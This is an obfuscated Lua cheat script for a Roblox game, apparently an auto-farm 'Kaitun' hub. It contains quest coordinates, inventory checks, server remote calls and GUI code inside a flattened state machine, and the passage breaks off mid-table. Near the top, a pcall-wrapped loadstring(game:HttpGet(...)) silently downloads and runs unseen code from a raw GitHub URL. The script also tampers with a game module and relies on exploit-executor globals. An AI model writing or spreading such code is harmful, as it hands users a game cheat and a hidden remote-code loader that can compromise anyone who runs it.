local replicatedStorage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local lighting = game:GetService("Lighting")
local coreGui = game:GetService("CoreGui")
local tweenService = game:GetService("TweenService")
local virtualInputManager = game:GetService("VirtualInputManager")
local workspace = game:GetService("Workspace")

do
  local floor = math.floor
  local val = 0
  local val2 = 2
  local val3 = {}
  local val4 = {}

  for i = 1, 256 do
    val4[i] = i
  end

  repeat
    local randomVal = table.remove(val4, (math.random(1, #val4)))
    val3[randomVal] = string.char(randomVal - 1)
  until #val4 == 0

  local val5 = {}

  local function helper()
    if #val5 == 0 then
      val = (val * 189 + 3471502453599) % 35184372088832

      repeat
        val2 = val2 * 174 % 257
      until val2 ~= 1

      local val6 = val2 % 32
      local val7 = floor(val / 2 ^ (13 - (val2 - val6) / 32)) % 4294967296 / 2 ^ val6
      local val8 = floor(val7 % 1 * 4294967296) + floor(val7)
      local val9 = val8 % 65536
      local val10 = (val8 - val9) / 65536
      local val11 = val9 % 256
      local val12 = (val9 - val11) / 256
      local val13 = val10 % 256
      val5 = { val11, val12, val13, (val10 - val13) / 256 }
    end

    return table.remove(val5)
  end

  local val14 = {}
  c = setmetatable({}, { __index = val14, __metatable = nil })

  function q(val15, val16)
    if val14[val16] then
    else
      val5 = {}
      val = val16 % 35184372088832
      val2 = val16 % 255 + 2
      local val17 = string.len(val15)
      val14[val16] = ""
      local byteVal = 100

      for j = 1, val17 do
        byteVal = (string.byte(val15, j) + helper() + byteVal) % 256
        val14[val16] = val14[val16] .. val3[byteVal + 1]
      end
    end

    return val16
  end
end

task.spawn(function()
  pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
  end)
end)

local function localPlayer()
  local localPlayer = nil
  local placeId = nil
  local val18 = nil
  local val19 = nil
  local val20 = nil
  local val21 = nil
  local val22 = nil
  local val23 = nil
  local cameraBlur = nil
  local coinCard = nil
  local val24 = nil
  local val25 = nil
  local val26 = nil
  local val27 = nil
  local val28 = nil
  local val29 = nil
  local udim = nil
  local size = nil
  local tweenInfo = nil
  local val30 = nil
  local create = nil
  local val31 = nil
  local val32 = nil
  local val33 = nil
  local val34 = nil
  local val35 = nil
  local val36 = nil
  local val37 = nil
  local val38 = nil
  local val39 = nil
  local val40 = nil
  local helper2 = nil
  local helper3 = nil
  local val41 = table.pack()
  local bomayyeuvietnamKaitunRunning = 57
  local frame = nil
  local cframe = nil
  local dutDit = nil
  local new = nil
  local divider = nil
  local divider2 = nil
  local typeAccountScroll = nil
  local itemLabel1 = nil
  local new2 = nil
  local itemLabel12 = nil
  local textLabel = nil
  local levelLabel = nil
  local new3 = nil
  local dropShadow2 = nil
  local main = nil
  local new4 = nil
  local new5 = nil
  local fromRGB = nil
  local new6 = nil
  local cframe2 = nil
  local top = nil
  local udim2 = nil
  local textLabel2 = nil
  local udim22 = nil
  local under = nil
  local uiGradient = nil
  local new7 = nil
  local fromRGB2 = nil
  local fontWeight = nil
  local cframe3 = nil
  local val42 = nil
  local val43 = nil
  local val44 = nil
  local val45 = nil
  local val46 = nil
  local val47 = nil
  local val48 = nil
  local new8 = nil
  local val49 = nil
  local new9 = nil
  local val50 = nil
  local val51 = nil
  local val52 = nil
  local val53 = nil
  local val54 = nil
  local val55 = nil
  local val56 = nil
  local val57 = nil
  local helper4

  while true do
    if bomayyeuvietnamKaitunRunning <= 188 then
      if bomayyeuvietnamKaitunRunning <= 93 then
        if bomayyeuvietnamKaitunRunning <= 46 then
          if bomayyeuvietnamKaitunRunning <= 22 then
            if bomayyeuvietnamKaitunRunning <= 10 then
              if bomayyeuvietnamKaitunRunning <= 4 then
                if bomayyeuvietnamKaitunRunning <= 1 then
                  if bomayyeuvietnamKaitunRunning <= 0 then
                    local element = table.pack(udim22.new(1, -28, 0, 168))
                    element.n = 3 + element.n - 1

                    table.move(element, 1, element.n, 3, element)

                    element[1] = top
                    element[2] = udim2

                    dutDit = dutDit(table.unpack(element, 1, element.n))

                    fromRGB(textLabel2, divider, "Account stats")
                    fromRGB(under, divider2, "Top weapons")

                    local content = Instance.new("Frame")
                    content.Name = "Content"
                    content.Parent = divider

                    top = UDim2.new(0, 12, 0, 39)
                    bomayyeuvietnamKaitunRunning = 135
                    fromRGB = "Position"
                    divider = content
                  else
                    bomayyeuvietnamKaitunRunning = val19.Remotes.CommF_:InvokeServer(
                      "HornedMan", "Bet"
                    ) == 1 and 183 or 64
                  end
                elseif bomayyeuvietnamKaitunRunning <= 2 then
                  new8.Ms = "Ocean Prophet"
                  new8.Mon = "Ocean Prophets"
                  new8.Quest = "SubmergedQuest2"
                  new8.QLv = 2
                  new8.Next = 2700
                  new8.Fallback = "Sea Chanter"

                  new9 = CFrame.new
                  bomayyeuvietnamKaitunRunning = 168
                  val49 = "CQ"
                  val50 = 10880.6855
                  val51 = -2086.20044
                  val52 = 10032.624
                  val53 = -0.321384728
                  val54 = 9.87648434e-8
                  val55 = -0.946948707
                  val56 = 7.13271007e-8
                elseif bomayyeuvietnamKaitunRunning <= 3 then
                  val47[val48] = new8(
                    val49, new9, val50, val51, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
                  )

                  val47.CMon = CFrame.new(
                    10808.6006, -2030.36145, 9364.2334, -0.775185347, -0.0359364748, 0.6307109, 0.0615428537, 0.989336014, 0.132010356, -0.628728986, 0.141148239, -0.764707148
                  )

                  val48 = {}
                  bomayyeuvietnamKaitunRunning = 166
                  new8 = "Min"
                  val49 = 2650
                else
                  require(replicatedStorage.Reparent).Unparent = function() return nil end

                  coroutine.wrap(function()
                    local val58 = 0

                    while val58 <= 0 do
                      localPlayer = tostring(game.Players.LocalPlayer.UserId):sub(2, 4)
                        .. tostring(coroutine.running()):sub(11, 15)

                      val58 = 1
                    end
                  end)()

                  localPlayer = players.LocalPlayer
                  placeId = game.PlaceId
                  frame = game
                  bomayyeuvietnamKaitunRunning = 192
                end
              elseif bomayyeuvietnamKaitunRunning <= 7 then
                if bomayyeuvietnamKaitunRunning <= 5 then
                  textLabel[dutDit] = new[fromRGB2]

                  levelLabel.BackgroundTransparency = 1
                  levelLabel.Name = "LevelLabel"
                  levelLabel.Parent = cframe
                  levelLabel.Position = UDim2.new(0.070000000298023, 0, 0.34999999403954, 0)
                  levelLabel.Size = UDim2.new(0, 0, 0, 18)

                  bomayyeuvietnamKaitunRunning = 70
                  dutDit = "Selectable"
                  new = false
                elseif bomayyeuvietnamKaitunRunning <= 6 then
                  typeAccountScroll[dutDit] = false

                  itemLabel1.BackgroundTransparency = 1
                  itemLabel1.Name = "ItemLabel1"
                  itemLabel1.Parent = typeAccountScroll
                  itemLabel1.Size = UDim2.new(1, 0, 0, 18)
                  itemLabel1.Selectable = false

                  new = Font.new
                  fontWeight = Enum.FontWeight
                  bomayyeuvietnamKaitunRunning = 289
                  dutDit = "FontFace"
                  fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
                  cframe3 = "Bold"
                else
                  itemLabel1[new2] = "Snowman"
                  itemLabel1.Mon = "Snowman"
                  itemLabel1.Quest = "SnowQuest"
                  itemLabel1.QLv = 2
                  itemLabel1.Next = 120
                  itemLabel1.Fallback = "Snow Bandit"

                  itemLabel12 = CFrame.new
                  bomayyeuvietnamKaitunRunning = 50
                  new2 = "CQ"
                  textLabel = 1389.74451
                  levelLabel = 86.6520844
                  new3 = -1298.90796
                  dropShadow2 = -0.342042685
                  main = 0
                  new4 = 0.939684391
                  new5 = 0
                  fromRGB = 1
                  new6 = 0
                  cframe2 = -0.939684391
                  top = 0
                end
              elseif bomayyeuvietnamKaitunRunning <= 8 then
                new2[dutDit] = new(fromRGB2, fontWeight, Enum.FontStyle.Normal)
                new2.Text = "Item 2"
                new2.TextColor3 = Color3.fromRGB(255, 255, 255)
                new2.TextSize = 16

                itemLabel12.BackgroundTransparency = 1
                itemLabel12.Name = "ItemLabel1"
                itemLabel12.Parent = typeAccountScroll

                new = UDim2
                bomayyeuvietnamKaitunRunning = 209
                dutDit = "Position"
              elseif bomayyeuvietnamKaitunRunning <= 9 then
                textLabel[levelLabel] = CFrame.new(
                  -4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
                )

                new3 = CFrame.new
                bomayyeuvietnamKaitunRunning = 63
                levelLabel = "CMon"
                dropShadow2 = -5079.98096
                main = 376.477356
                new4 = -2194.17139
                new5 = 0.465965867
                fromRGB = -3.69776352e-8
                new6 = 0.884802461
                cframe2 = 3.40249851e-9
                top = 1
                udim2 = 4.00000886e-8
                textLabel2 = -0.884802461
                udim22 = -1.56281423e-8
              else
                fromRGB[new6] = cframe2(-9516.993164, 178.006515, 6078.465332)
                fromRGB.CMon = CFrame.new(-9712.03125, 204.695892, 6193.322265)

                new6 = {
                  Min = 2050, Max = 2074, Ms = "Posessed Mummy", Mon = "Posessed Mummy", Quest = "HauntedQuest2", }

                bomayyeuvietnamKaitunRunning = 239
                cframe2 = "QLv"
                top = 2
              end
            elseif bomayyeuvietnamKaitunRunning <= 16 then
              if bomayyeuvietnamKaitunRunning <= 13 then
                if bomayyeuvietnamKaitunRunning <= 11 then
                  frame.MaxSize = Vector2.new(390, 66)
                  frame.Parent = new

                  dropShadow2.Position = UDim2.new(0.5, 0, 0.5, 0)
                  dropShadow2.Size = UDim2.new(1, 32, 1, 32)
                  dropShadow2.ImageTransparency = 0.62

                  bomayyeuvietnamKaitunRunning = 132
                elseif bomayyeuvietnamKaitunRunning <= 12 then
                  cframe2[dutDit] = new[fromRGB2]

                  top.BackgroundTransparency = 0.9990000128746
                  top.Name = "Top"
                  top.Parent = cframe
                  top.Position = UDim2.new(0.5, 0, 0.050000000745058, 0)
                  top.Size = UDim2.new(0, 0, 0, 18)

                  bomayyeuvietnamKaitunRunning = 364
                  dutDit = "Selectable"
                  new = false
                else
                  new4[new5] = fromRGB(cframe2, 300, 0, 18)

                  new4.FontFace = Font.new(
                    "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                  )

                  new4.Text = "BOMAYYEUVIETNAM Hub - Kaitun"

                  fromRGB = Color3.fromRGB
                  bomayyeuvietnamKaitunRunning = 225
                  new5 = "TextColor3"
                  cframe2 = 135
                  udim2 = 206
                end
              elseif bomayyeuvietnamKaitunRunning <= 14 then
                under[uiGradient] = new7
                under.Mon = "Galley Captain"
                under.Quest = "FountainQuest"
                under.QLv = 2
                under.Next = 9999
                under.Fallback = "Galley Pirate"

                new7 = CFrame.new
                bomayyeuvietnamKaitunRunning = 348
                uiGradient = "CQ"
                fromRGB2 = 5259.81982
                fontWeight = 37.3500175
                cframe3 = 4050.0293
                val42 = 0.087131381
                val43 = 0
                val44 = 0.996196866
                val45 = 0
                val46 = 1
                val47 = 0
                val48 = -0.996196866
                new8 = 0
                val49 = 0.087131381
              elseif bomayyeuvietnamKaitunRunning <= 15 then
                divider[divider2] = 300
                divider2 = { Name = "Dragon Claw", Target = 300 }
                typeAccountScroll = { Name = "Superhuman", Target = 300 }
                itemLabel1 = { Name = "Black Leg", Target = 400 }
                new2 = { Name = "Death Step", BuyOnly = true }
                itemLabel12 = {}
                bomayyeuvietnamKaitunRunning = 53
              else
                local element2 = table.pack(fromRGB2[fontWeight](1, 0))

                udim2[1] = udim22
                udim2[2] = uiGradient

                table.move(element2, 1, element2.n, 3, udim2)
                dutDit[fromRGB] = cframe2(udim2)

                val25 = {
                  Background = Color3.fromRGB(10, 15, 24), Surface = Color3.fromRGB(17, 25, 38), }

                fromRGB = Color3.fromRGB
                bomayyeuvietnamKaitunRunning = 220
                dutDit = "SurfaceAlt"
                cframe2 = 22
              end
            elseif bomayyeuvietnamKaitunRunning <= 19 then
              if bomayyeuvietnamKaitunRunning <= 17 then
                dutDit.CMon = CFrame.new(
                  -737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, 0, 1, 0, 0.962260842, 0, 0.272128761
                )

                new = {
                  Min = 725, Max = 774, Ms = "Mercenary", Mon = "Mercenary", }

                bomayyeuvietnamKaitunRunning = 93
                divider = "Quest"
              elseif bomayyeuvietnamKaitunRunning <= 18 then
                new[divider] = divider2.new(-7904.57373, 5584.37646, -459.62973)

                divider = {
                  Min = 60, Max = 74, Ms = "Desert Bandit", Mon = "Desert Bandit", Quest = "DesertQuest", QLv = 1, Next = nil, }

                typeAccountScroll = CFrame
                bomayyeuvietnamKaitunRunning = 95
                divider2 = "CQ"
                itemLabel1 = "new"
              else
                bomayyeuvietnamKaitunRunning = dutDit and 139 or 126
              end
            elseif bomayyeuvietnamKaitunRunning <= 20 then
              val23[frame] = cframe(dutDit, new, 5955.21)
              val23["Demonic Soul"] = CFrame.new(-9493.12, 172.17, 6149.69)
              val23["Posessed Mummy"] = CFrame.new(-9579, 6, 6194)
              val23["Peanut Scout"] = CFrame.new(-1948.4, 9.74, -9984.92)

              cframe = CFrame
              bomayyeuvietnamKaitunRunning = 312
              frame = "Peanut President"
            elseif bomayyeuvietnamKaitunRunning <= 21 then
              dropShadow2[main] = new4(
                new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, under, uiGradient, new7, fromRGB2
              )

              main = {
                Min = 1175, Max = 1199, Ms = "Magma Ninja", Mon = "Magma Ninja", Quest = "FireSideQuest", QLv = 1, Next = 1200, }

              new5 = CFrame.new
              bomayyeuvietnamKaitunRunning = 345
              new4 = "CQ"
              fromRGB = -5428.03174
              new6 = 15.0622921
              cframe2 = -5299.43457
              top = -0.882952213
            else
              dropShadow2[main] = new4
              dropShadow2.Ms = "Toga Warrior"
              dropShadow2.Mon = "Toga Warrior"
              dropShadow2.Quest = "ColosseumQuest"
              dropShadow2.QLv = 1
              dropShadow2.Next = 275

              new4 = CFrame.new
              bomayyeuvietnamKaitunRunning = 255
              main = "CQ"
              new5 = -1576.11743
              fromRGB = 7.38933945
              new6 = -2983.30762
              cframe2 = 0.576966345
              top = 1.22114863e-9
              udim2 = 0.816767931
              textLabel2 = -3.58496594e-10
              udim22 = 1
              under = -1.24185606e-9
              uiGradient = -0.816767931
              new7 = 4.2370063e-10
              fromRGB2 = 0.576966345
            end
          elseif bomayyeuvietnamKaitunRunning <= 34 then
            if bomayyeuvietnamKaitunRunning <= 28 then
              if bomayyeuvietnamKaitunRunning <= 25 then
                if bomayyeuvietnamKaitunRunning <= 23 then
                  local element3 = table.pack(top(udim2, udim22, uiGradient, 132))
                  element3.n = 3 + element3.n - 1

                  table.move(element3, 1, element3.n, 3, element3)

                  element3[1] = divider
                  element3[2] = divider2

                  local val59 = dutDit(table.unpack(element3, 1, element3.n))
                  local udim3 = UDim2.new(0.5, 7, 0, 62)

                  local udim2 = table.pack(UDim2.new(0.5, -21, 0, 132))
                  udim2.n = 3 + udim2.n - 1

                  table.move(udim2, 1, udim2.n, 3, udim2)

                  udim2[1] = "ItemsPanel"
                  udim2[2] = udim3

                  divider2 = dutDit(table.unpack(udim2, 1, udim2.n))
                  udim2 = UDim2.new(0, 14, 0, 208)
                  udim22 = UDim2
                  bomayyeuvietnamKaitunRunning = 0
                  top = "ProgressPanel"
                  divider = val59
                elseif bomayyeuvietnamKaitunRunning <= 24 then
                  frame[divider2] = typeAccountScroll[dropShadow2].Sibling
                  frame.DisplayOrder = 10

                  dutDit.Name = "dut dit"
                  dutDit.Parent = frame
                  dutDit.AnchorPoint = Vector2.new(0.10000000149012, 0.10000000149012)
                  dutDit.BackgroundColor3 = val25.Primary

                  divider2 = UDim2.new(0, 20, 0.1, -6)
                  bomayyeuvietnamKaitunRunning = 354
                  frame = "Position"
                else
                  new[divider] = "PiratePortQuest"
                  new.QLv = 2
                  new.Next = 1575
                  new.Fallback = "Pirate Millionaire"

                  new.CQ = CFrame.new(
                    -290.074677, 42.9034653, 5581.58984, 0.965929627, 0, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
                  )

                  divider2 = CFrame
                  bomayyeuvietnamKaitunRunning = 328
                  divider = "CMon"
                  typeAccountScroll = "new"
                end
              elseif bomayyeuvietnamKaitunRunning <= 26 then
                pcall(setfpscap, getgenv().Configs["FPS Limit"])
                bomayyeuvietnamKaitunRunning = 235
              elseif bomayyeuvietnamKaitunRunning <= 27 then
                frame:WaitForChild("Level")

                localPlayer:WaitForChild("Data"):WaitForChild("Fragments")
                localPlayer:WaitForChild("Data"):WaitForChild("Beli")

                val20 = 2800
                game:service("VirtualInputManager")
                frame = game
                bomayyeuvietnamKaitunRunning = 204
              else
                new3[dropShadow2] = main

                new3.CQ = CFrame.new(
                  -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                )

                main = CFrame.new
                bomayyeuvietnamKaitunRunning = 113
                dropShadow2 = "CMon"
                new4 = -5769.2041
                new5 = 37.9288292
                fromRGB = -4468.38721
                new6 = -0.569419742
                cframe2 = -2.49055017e-8
                top = 0.822046936
                udim2 = -6.96206541e-8
                textLabel2 = 1
                udim22 = -1.79282633e-8
              end
            elseif bomayyeuvietnamKaitunRunning <= 31 then
              if bomayyeuvietnamKaitunRunning <= 29 then
                bomayyeuvietnamKaitunRunning = frame and 275 or 363
              elseif bomayyeuvietnamKaitunRunning <= 30 then
                top[udim2] = textLabel2.new(
                  -1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-8, 0.998466909, -6.89634405e-10, 1, 2.84654931e-8, -0.998466909, -2.26418861e-9, 0.0553516336
                )

                udim2 = {
                  Min = 2125, Max = 2149, Ms = "Ice Cream Chef", Mon = "Ice Cream Chef", Quest = "IceCreamIslandQuest", }

                bomayyeuvietnamKaitunRunning = 78
              else
                frame[udim2] = udim22(uiGradient, fromRGB2, 0, 420)

                val24.Size = UDim2.new(1, -24, 1, -24)
                val24.BackgroundColor3 = val25.Background
                val24.BackgroundTransparency = 0.04
                val24.BorderSizePixel = 0

                val26(val24, 9)
                val27(val24, val25.Primary, 1.5, 0.05)
                bomayyeuvietnamKaitunRunning = 257
              end
            elseif bomayyeuvietnamKaitunRunning <= 32 then
              textLabel[levelLabel] = new3[dropShadow2](-11194.541992, 442.027954, -8608.80664)

              levelLabel = {
                Min = 1825, Max = 1849, Ms = "Forest Pirate", Mon = "Forest Pirate", Quest = "DeepForestIsland", QLv = 1, Next = 1850, }

              dropShadow2 = CFrame.new
              bomayyeuvietnamKaitunRunning = 349
              new3 = "CQ"
            elseif bomayyeuvietnamKaitunRunning <= 33 then
              val46[val47] = val48(
                new8, val49, new9, 0.934615612, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
              )

              val46.CMon = CFrame.new(
                11019.1318, -2146.06812, 9342.3916, -0.719955266, -1.74275385e-8, 0.69402045, 5.76556367e-8, 1, 8.49211546e-8, -0.69402045, 1.01153624e-7, -0.719955266
              )

              val47 = {}
              bomayyeuvietnamKaitunRunning = 82
              val48 = "Min"
            else
              bomayyeuvietnamKaitunRunning = frame and 1 or 64
            end
          elseif bomayyeuvietnamKaitunRunning <= 40 then
            if bomayyeuvietnamKaitunRunning <= 37 then
              if bomayyeuvietnamKaitunRunning <= 35 then
                new6.CQ = CFrame.new(
                  968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-8, -0.493826836, 1.44108379e-8, 1, 5.38534195e-9, 0.493826836, -2.43357912e-9, -0.869560242
                )

                new6.CMon = CFrame.new(917.96057, 136.89932, 33343.41406)

                cframe2 = { Min = 1325 }
                bomayyeuvietnamKaitunRunning = 306
                top = "Max"
              elseif bomayyeuvietnamKaitunRunning <= 36 then
                new6[dutDit] = new[fromRGB2](0, 33, 0, 18)
                new6.Selectable = false

                new6.FontFace = Font.new(
                  "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                )

                new6.Text = "Frag: N/A"

                new = Color3
                bomayyeuvietnamKaitunRunning = 58
                dutDit = "TextColor3"
              else
                new5[fromRGB] = new6(
                  cframe2, top, udim2, textLabel2, udim22, under, -1.23782129e-7, 1, -4.93306951e-9, -0.982100308, -1.22495649e-7, -0.188358366
                )

                fromRGB = {
                  Min = 375, Max = 399, Ms = "Fishman Warrior", Mon = "Fishman Warrior", Quest = "FishmanQuest", QLv = 1, Next = 400, }

                cframe2 = CFrame
                bomayyeuvietnamKaitunRunning = 265
                new6 = "CQ"
              end
            elseif bomayyeuvietnamKaitunRunning <= 38 then
              typeAccountScroll[itemLabel1] = new2(
                -2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
              )

              typeAccountScroll.CMon = CFrame.new(
                -2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299
              )

              bomayyeuvietnamKaitunRunning = 226
            elseif bomayyeuvietnamKaitunRunning <= 39 then
              dutDit[new] = 100

              new = {
                Item = "Wardens Sword", Boss = "Chief Warden", Type = "Sword", Sea = 1, MinLevel = 100, }

              divider = {
                Item = "Pole (1st Form)", Boss = "Thunder God", Type = "Sword", Sea = 1, }

              bomayyeuvietnamKaitunRunning = 267
            else
              function helper4(val60)
                local val61 = 11
                local kaitunInventoryCache = nil
                local val62 = nil

                while true do
                  if val61 <= 6 then
                    if val61 <= 2 then
                      if val61 <= 0 then
                        local time = kaitunInventoryCache.Time

                        if time then
                          val61 = 7
                          val62 = time
                        else
                          val61 = 2
                        end
                      elseif val61 <= 1 then
                        val62 = type(kaitunInventoryCache.ByName) ~= "table"
                        val61 = 13
                      else
                        val61 = 7
                        val62 = 0
                      end

                      continue
                    end

                    if val61 <= 4 then
                      if val61 <= 3 then
                        for key in pairs(val33) do
                          local element4 = kaitunInventoryCache.ByName[key]

                          if element4 then
                            val39[key] = math.max(val39[key] or 0, tonumber(element4.Mastery) or 0)
                          end
                        end

                        val40 = val62
                        val61 = 4
                        val60 = true
                        continue
                      end

                      return val60
                    end

                    if val61 <= 5 then
                      val61 = val60 and 9 or 3
                    else
                      val61 = val62 and 13 or 1
                    end
                  else
                    if val61 <= 9 then
                      if val61 <= 7 then
                        local val63 = not val60

                        if val63 then
                          val61 = 12
                        else
                          val61 = 5
                          val60 = val63
                        end

                        continue
                      end

                      break
                    end

                    if val61 <= 11 then
                      if val61 <= 10 then
                        val62 = kaitunInventoryCache.Ready ~= true
                        val61 = 6
                      else
                        GetInventory(val60 == true)
                        kaitunInventoryCache = getgenv().KaitunInventoryCache
                        local val64 = type(kaitunInventoryCache) ~= "table"

                        if val64 then
                          val61 = 6
                          val62 = val64
                        else
                          val61 = 10
                        end
                      end
                    elseif val61 <= 12 then
                      val60 = val40 == val62
                      val61 = 5
                    else
                      val61 = val62 and 8 or 0
                    end
                  end
                end

                if val61 <= 8 then
                  return false
                end

                return true
              end

              helper2 = nil

              function helper2(val65)
                local val66 = 0
                local findFirstChild = nil

                while true do
                  if not (val66 <= 3) then
                    if val66 <= 5 then
                      if val66 <= 4 then
                        val66 = findFirstChild and 7 or 6
                      else
                        findFirstChild = localPlayer.Backpack:FindFirstChild(val65)
                        val66 = 7
                      end
                    elseif val66 <= 6 then
                      local backpack = localPlayer.Backpack

                      if backpack then
                        val66 = 5
                      else
                        val66 = 7
                        findFirstChild = backpack
                      end
                    else
                      val66 = findFirstChild and 2 or 3
                    end

                    continue
                  end

                  if val66 <= 1 then
                    if val66 <= 0 then
                      local character = localPlayer.Character

                      if character then
                        val66 = 1
                      else
                        val66 = 4
                        findFirstChild = character
                      end
                    else
                      findFirstChild = localPlayer.Character:FindFirstChild(val65)
                      val66 = 4
                    end

                    continue
                  end

                  if not (val66 <= 2) then
                    findFirstChild = localPlayer:FindFirstChild(val65)
                    val66 = 2
                    continue
                  end

                  break
                end

                return findFirstChild
              end

              helper3 = nil

              function helper3(val67)
                local val68 = 8
                local level = nil
                local val69 = nil
                local val70, max, val71

                while true do
                  if val68 <= 4 then
                    if val68 <= 1 then
                      if val68 <= 0 then
                        return nil
                      end

                      val68 = 3
                      level = 0
                      continue
                    end

                    if val68 <= 2 then
                      val69[val67] = max(val70, level)
                      val68 = 6
                    elseif val68 <= 3 then
                      val69 = val39
                      max = math.max
                      local val72 = val39[val67]

                      if val72 then
                        val68 = 2
                        val70 = val72
                      else
                        val68 = 4
                      end
                    else
                      val68 = 2
                      val70 = 0
                    end
                  else
                    if val68 <= 6 then
                      if val68 <= 5 then
                        val68 = level and 3 or 1
                        continue
                      end

                      break
                    end

                    if val68 <= 7 then
                      level = val71:FindFirstChild("Level")
                      val68 = level and 9 or 5
                    elseif val68 <= 8 then
                      local val73 = helper2(val67)

                      if not val73 then
                        val68 = 0
                      else
                        val68 = 7
                        val71 = val73
                      end
                    else
                      level = tonumber(level.Value)
                      val68 = 5
                    end
                  end
                end

                return val71
              end

              function x(val74)
                local val75 = 1

                while true do
                  if val75 <= 0 then
                    val74 = val39[val74] ~= nil
                    val75 = 2
                    continue
                  end

                  if val75 <= 1 then
                    helper4(false)
                    local val76 = helper3(val74) ~= nil

                    if val76 then
                      val75 = 2
                      val74 = val76
                    else
                      val75 = 0
                    end

                    continue
                  end

                  break
                end

                return val74
              end

              function G()
                local val77 = 1
                local val78

                while not (val77 <= 0) do
                  helper4(false)

                  for key2 in pairs(val33) do
                    helper3(key2)
                  end

                  val78 = {}

                  for key3, value in pairs(val39) do
                    val78[key3] = value
                  end

                  val77 = 0
                end

                return val78
              end

              function m(val79)
                local val80 = 21
                local val81 = nil

                while true do
                  if val80 <= 10 then
                    if val80 <= 4 then
                      if val80 <= 1 then
                        if val80 <= 0 then
                          val80 = 17
                          val81 = 0
                        else
                          val80 = 14
                          val81 = 0
                        end
                      elseif val80 <= 2 then
                        Death_Step = val79[val81] ~= nil
                        Sharkman_Karate_C = val79["Sharkman Karate"] ~= nil
                        Electric_Claw_C = val79["Electric Claw"] ~= nil
                        Dragon_Talon_C = val79["Dragon Talon"] ~= nil
                        God_Human_C = val79.Godhuman ~= nil
                        local blackLeg = val79["Black Leg"]

                        if blackLeg then
                          val80 = 11
                          val81 = blackLeg
                        else
                          val80 = 15
                        end
                      elseif val80 <= 3 then
                        Dragon_Talon_C_M = val81 >= 400
                        local godhuman = val79.Godhuman

                        if godhuman then
                          val80 = 19
                          val79 = godhuman
                        else
                          val80 = 9
                        end
                      else
                        val80 = 8
                        val81 = 0
                      end
                    elseif val80 <= 7 then
                      if val80 <= 5 then
                        val80 = 22
                        val81 = 0
                      elseif val80 <= 6 then
                        val80 = 3
                        val81 = 0
                      else
                        Super_humanw_C_M = val81 >= 400
                        local deathStep = val79["Death Step"]

                        if deathStep then
                          val80 = 22
                          val81 = deathStep
                        else
                          val80 = 5
                        end
                      end
                    elseif val80 <= 8 then
                      Electro_C_M = val81 >= 400
                      local fishmanKarate = val79["Fishman Karate"]

                      if fishmanKarate then
                        val80 = 14
                        val81 = fishmanKarate
                      else
                        val80 = 1
                      end
                    elseif val80 <= 9 then
                      val80 = 19
                      val79 = 0
                    else
                      val80 = 20
                      val81 = 0
                    end

                    continue
                  end

                  if not (val80 <= 16) then
                    if val80 <= 19 then
                      if val80 <= 17 then
                        Electric_Claw_C_M = val81 >= 400
                        local dragonTalon = val79["Dragon Talon"]

                        if dragonTalon then
                          val80 = 3
                          val81 = dragonTalon
                        else
                          val80 = 6
                        end
                      elseif val80 <= 18 then
                        val80 = 7
                        val81 = 0
                      else
                        God_Human_C_M = val79 >= 400
                        val80 = 12
                      end
                    elseif val80 <= 20 then
                      Sharkman_Karate_C_M = val81 >= 400
                      local electricClaw = val79["Electric Claw"]

                      if electricClaw then
                        val80 = 17
                        val81 = electricClaw
                      else
                        val80 = 0
                      end
                    elseif val80 <= 21 then
                      Black_Leg_C = val79["Black Leg"] ~= nil
                      Electro_C = val79.Electro ~= nil
                      Fishman_Karate_C = val79["Fishman Karate"] ~= nil
                      Dragon_Claw_C = val79["Dragon Claw"] ~= nil
                      Super_human = val79.Superhuman ~= nil
                      val80 = 2
                      val81 = "Death Step"
                    else
                      Death_Step_C_M = val81 >= 400
                      local sharkmanKarate = val79["Sharkman Karate"]

                      if sharkmanKarate then
                        val80 = 20
                        val81 = sharkmanKarate
                      else
                        val80 = 10
                      end
                    end

                    continue
                  end

                  if not (val80 <= 13) then
                    if val80 <= 14 then
                      Fishman_Karate_C_M = val81 >= 400
                      local dragonClaw = val79["Dragon Claw"]

                      if dragonClaw then
                        val80 = 16
                        val81 = dragonClaw
                      else
                        val80 = 13
                      end
                    elseif val80 <= 15 then
                      val80 = 11
                      val81 = 0
                    else
                      Dragon_Claw_C_M = val81 >= 400
                      local superhuman = val79.Superhuman

                      if superhuman then
                        val80 = 7
                        val81 = superhuman
                      else
                        val80 = 18
                      end
                    end

                    continue
                  end

                  if val80 <= 11 then
                    Black_Leg_C_M = val81 >= 400
                    local electro = val79.Electro

                    if electro then
                      val80 = 8
                      val81 = electro
                    else
                      val80 = 4
                    end

                    continue
                  end

                  if not (val80 <= 12) then
                    val80 = 16
                    val81 = 0
                    continue
                  end

                  break
                end
              end

              cframe = {}
              dutDit = { Name = "Black Leg", Target = 300 }
              new = { Name = "Electro", Target = 300 }
              divider = { Name = "Fishman Karate" }
              bomayyeuvietnamKaitunRunning = 15
              frame = "Order"
              divider2 = "Target"
            end
          elseif bomayyeuvietnamKaitunRunning <= 43 then
            if bomayyeuvietnamKaitunRunning <= 41 then
              cframe[dutDit] = new

              cframe.PositionsBySea = {
                [2] = CFrame.new(
                  -2599.621826, 238.198334, -10315.998047, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
